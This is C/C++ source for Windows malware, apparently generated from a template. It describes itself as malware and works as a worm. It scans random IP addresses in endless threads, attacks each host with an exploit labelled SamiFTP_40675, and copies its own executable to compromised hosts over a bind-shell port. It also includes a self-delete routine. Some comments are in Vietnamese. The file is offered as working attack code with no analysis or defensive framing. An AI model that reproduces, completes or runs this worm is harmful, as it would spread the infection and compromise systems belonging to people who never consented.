#include "a2.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";

int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//[ninjaModule]
	if(argc==0){/*normal process*/
	//[moduleThreads]
	
	//
	int  ipAddress[4];
RandomChooseIP(ipAddress);
	for (;;){
	initAttack(ipAddress);
    }
    WSACleanup();
	

	}
	//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
int initAttack(int ipAddress[]){
	
	register int i,j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
	
	//
    curIP[0]=ipAddress[0];
    curIP[1]=ipAddress[1];
    curIP[2]=ipAddress[2];
    curIP[3]=ipAddress[3];
    printf("Exploit SamiFTP_40675");
	for(i=0; i<MAX_THREADS;i++){
		RandomChooseIP_IncreaseIP(curIP);
		// Allocate memory for thread data.
		pDataArray[i] = (PthreadData) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,sizeof(threadData));
		if( pDataArray[i] == NULL ){
           // If the array allocation fails, the system is out of memory
           // so there is no point in trying to print an error message.
           // Just terminate execution.
			printf("out of memory!\n");
            return 0;
        }
        //init data
        //Bindport for each exploit module.
        ipAr2Str(curIP,pDataArray[i]->strIP);
        pDataArray[i]->shellPort=BINDPORT_SamiFTP_40675;
        
        hThreadArray[i] = CreateThread( 
            NULL,                   
            0,                        
            exploit_SamiFTP_40675,       			// thread function name
            pDataArray[i],          
            0,                      
            &dwThreadIdArray[i]);   
		if (hThreadArray[i] == NULL) {
			printf("Thread %d is not create!\n",i );
        }
        else{
        	printf("Thread %d is create!\n",i );
        }
	}
	//Đợi tất cả các threads được tắt
	WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);
	for(int i=0; i<MAX_THREADS; i++){
        CloseHandle(hThreadArray[i]);
        if(pDataArray[i] != NULL)
        {
            HeapFree(GetProcessHeap(), 0, pDataArray[i]);
            pDataArray[i] = NULL;    // Ensure address is not reused.
        }
    }

//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
    return 1;
}

//


DWORD WINAPI exploit_SamiFTP_40675(LPVOID lpParam) {
	PthreadData pData;
	pData = (PthreadData)lpParam;
	int sock;
	sock = isTarget_SamiFTP_40675(pData->strIP);
	if (sock) {
		std::string tmpFileName ="";
		tmpFileName = fileName;
		if (isRandomName) {
		tmpFileName = RandomStr(8) + ".exe";
		//[randomeNameModule](tmpFileName);
		}
		printf("victim: %s\n", pData->strIP);
		SamiFTP_40675(sock, pData->strIP);
		int a;
		a = Base64P2P(pData->strIP, pData->shellPort, tmpFileName);
		//printf("Done exploti!");
		if (isRandomName)
		{
			//delete new exe
			std::string NewExePath = (std::string)fullName;
			NewExePath = NewExePath.substr(0, NewExePath.find_last_of("\\"));
			NewExePath += "\\" + tmpFileName;
			DeleteFileA(NewExePath.c_str());
		}
		printf("DEBUG %d\n", a);
	}
	else
	{
		printf("ip: %s can't exploit!\n", pData->strIP);
	}
	return 0;
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
